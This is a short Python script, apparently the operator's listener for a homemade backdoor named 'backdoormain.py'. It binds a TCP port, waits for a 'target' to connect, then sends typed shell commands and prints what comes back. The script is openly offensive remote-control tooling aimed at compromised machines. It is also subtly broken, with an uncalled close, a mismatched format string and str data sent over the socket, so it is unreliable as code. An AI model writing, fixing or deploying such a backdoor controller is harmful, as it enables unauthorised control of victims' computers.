#!/usr/bin/python

import socket

#socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#bind to destination
s.bind(("ipaddress", 54321))
#listen for connections
#specify amount of connections
s.listen(1)
print('listening....')
target, ip = s.accept()
print('target connected')
s.close

#chmod +x backdoormain.py cause of course

message = input('"* Shell#~%:' % str(ip))
target.send(message)
result = target.recv(1024)
print(result)
s.close()